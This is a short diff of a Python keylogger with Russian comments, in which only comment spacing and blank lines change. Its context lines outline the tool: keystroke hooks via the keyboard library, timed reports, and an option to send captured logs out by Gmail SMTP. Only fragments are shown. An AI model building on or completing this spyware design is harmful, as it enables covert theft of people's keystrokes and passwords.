@@ -1,6 +1,6 @@
 import keyboard
-import smtplib  # для отправки электронной почты по протоколу SMTP (gmail)
-# Таймер для запуска через заданный «интервал» времени.
+import smtplib #для отправки электронной почты по протоколу SMTP (gmail)
+#Таймер для запуска через заданный «интервал» времени.
 from threading import Timer
 from datetime import datetime
 
@@ -66,7 +66,6 @@ class Keylogger:
         server.quit()
 
     def report(self):
-
         if self.log:
             self.end_dt = datetime.now()
             # обновить `self.filename`
@@ -89,7 +88,6 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
-
 
 if __name__ == "__main__":
     # для отправки по email раскомментировать строку ниже и закомментировать строку с report_method="file"
